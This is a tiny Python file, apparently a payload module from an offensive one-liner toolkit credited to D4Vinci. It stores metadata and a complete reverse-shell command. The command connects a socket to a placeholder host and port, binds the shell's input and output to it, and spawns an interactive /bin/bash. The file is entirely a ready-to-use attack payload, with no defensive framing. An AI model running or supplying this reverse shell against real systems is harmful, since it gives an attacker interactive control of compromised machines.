class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use python socket to connect back & execute commands with subprocess."
    function    = "reverse shell"
    liner     = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TARGET",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' """
